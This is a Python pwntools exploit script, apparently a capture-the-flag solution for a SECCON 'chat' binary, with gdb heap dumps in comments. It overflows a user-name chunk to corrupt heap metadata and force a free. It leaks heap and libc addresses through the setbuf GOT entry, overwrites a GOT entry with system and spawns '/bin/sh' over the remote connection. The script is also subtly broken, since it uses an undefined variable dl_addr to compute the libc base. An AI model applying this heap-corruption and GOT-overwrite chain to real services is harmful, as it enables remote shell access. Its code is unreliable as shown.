from pwn import *

# p = process('./chat')
p = remote('chat.pwn.seccon.jp', 26895)

def read_menu1():
	p.recvuntil('menu > ')

def read_menu2():
	p.recvuntil('menu >> ')

def sign_up(name):
	read_menu1()
	p.sendline('1')
	p.recvuntil('name > ')
	p.sendline(name)

def sign_in(name):
	read_menu1()
	p.sendline('2')
	p.recvuntil('name > ')
	p.sendline(name)

def list_user():
	read_menu2()
	p.sendline('3')
	p.recvuntil('* ')
	p.recvuntil('* ')
	p.recvuntil('* ')
	p.recvuntil('* ')
	p.recvuntil('* ')
	leak = p.recvuntil('\n', drop=True).ljust(8, '\x00')
	return leak

def sign_out():
	read_menu2()
	p.sendline('0')

def change_name(new_name):
	read_menu2()
	p.sendline('7')
	p.recvuntil('name >> ')
	p.sendline(new_name)

def force_free(msg='\xff'):
	read_menu2()
	p.sendline('7')
	p.recvuntil('name >> ')
	p.sendline(msg)

def post_public_msg(msg):
	read_menu2()
	p.sendline('4')
	p.recvuntil('message >> ')
	# p.interactive()
	p.sendline(msg)

def delete_public_msg(_id):
	read_menu2()
	p.sendline('6')
	p.recvuntil('id >> ')
	# p.interactive()
	p.sendline(str(_id))

'''
gdb-peda$ x/20gx 0x00604000
0x604000:	0x0000000000000000	0x0000000000000021
0x604010:	0x0000000000604030	0x0000000000000000
0x604020:	0x0000000000000000	0x0000000000000021
0x604030:	0x0000000000646170	0x0000000000000000
0x604040:	0x0000000000000000	0x0000000000000021
0x604050:	0x0000000000604070	0x0000000000000000
0x604060:	0x0000000000000000	0x0000000000000021
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x00000000000000a1
0x604090:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x6040a0:	0x0000000000000000	0x0000000000000021
0x6040b0:	0x0000000000000000	0x0000000000000000
0x6040c0:	0x0000000000000000	0x0000000000000021
0x6040d0:	0x00000000006040f0	0x0000000000000000
0x6040e0:	0x0000000000000000	0x0000000000000021
0x6040f0:	0x0000000000000043	0x0000000000000000
0x604100:	0x0000000000000000	0x0000000000000021
0x604110:	0x0000000000604130	0x0000000000000000
0x604120:	0x00000000000000a0	0x0000000000000020
0x604130:	0x0000000000000044	0x0000000000000000
0x604140:	0x0000000000000000	0x0000000000000021
0x604150:	0x0000000000604170	0x0000000000000000
0x604160:	0x0000000000000000	0x0000000000000021
0x604170:	0x0000000000000045	0x0000000000000000
0x604180:	0x0000000000000000	0x0000000000020e81
'''

'''
gdb-peda$ x/20gx 0x00604000
0x604000:	0x0000000000000000	0x0000000000000021
0x604010:	0x0000000000604030	0x0000000000000000
0x604020:	0x0000000000000000	0x0000000000000021
0x604030:	0x0000000000646170	0x0000000000000000
0x604040:	0x0000000000000000	0x0000000000000021
0x604050:	0x0000000000604070	0x0000000000000000
0x604060:	0x0000000000000000	0x0000000000000021
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x00000000000000a1
0x604090:	0x00007fff00000001	0x0000000000604150
gdb-peda$
0x6040a0:	0x4141414141414141	0x4141414141414141
0x6040b0:	0x4141414141414141	0x4141414141414141
0x6040c0:	0x4141414141414141	0x4141414141414141
0x6040d0:	0x4141414141414141	0x4141414141414141
0x6040e0:	0x4141414141414141	0x4141414141414141
0x6040f0:	0x4141414141414141	0x4141414141414141
0x604100:	0x4141414141414141	0x4141414141414141
0x604110:	0x4141414141414141	0x0000414141414141
0x604120:	0x0000000000000000	0x0000000000000021
0x604130:	0x0000000000000044	0x0000000000000000
gdb-peda$
0x604140:	0x0000000000000000	0x0000000000000021
0x604150:	0x0000000000604170	0x0000000000000000
0x604160:	0x0000000000000000	0x0000000000000021
0x604170:	0x0000000000000045	0x0000000000000000
0x604180:	0x0000000000000000	0x0000000000020e81
0x604190:	0x0000000000000000	0x0000000000000000
0x6041a0:	0x0000000000000000	0x0000000000000000
0x6041b0:	0x0000000000000000	0x0000000000000000
0x6041c0:	0x0000000000000000	0x0000000000000000
0x6041d0:	0x0000000000000000	0x0000000000000000
'''

setbuf_got = 0x603031

# addr: 0x7f2518327100

sign_up('pad')
sign_up('A')
sign_up('B')
sign_up(chr(0x51))
sign_up('F')
sign_up('E') # in-affected

sign_in('A')
change_name('A' * 24 + '\xa1')
sign_out()
sign_in('B')
force_free()

p.recvuntil('Bye, ')
top = p.recvuntil('\n', drop=True)
top = u64(top.ljust(8, '\x00'))
print hex(top)
heap_base = top - 0x180
print 'heap base: %s' % hex(heap_base)

sign_in(chr(0x51))
post_public_msg('A' * (6 * 8) + p64(setbuf_got))
setbuf_addr = (u64(list_user()) << 0x8) + 0x00
print 'setbuf addr: %s' % hex(setbuf_addr)
libc_base = dl_addr - 0x72100
print 'libc base: %s' % hex(libc_base)
system_addr = libc_base + 0x46590
print 'system: %s' % hex(system_addr)

change_name('A' * 7 + p64(system_addr))

p.sendline('/bin/sh')

p.interactive()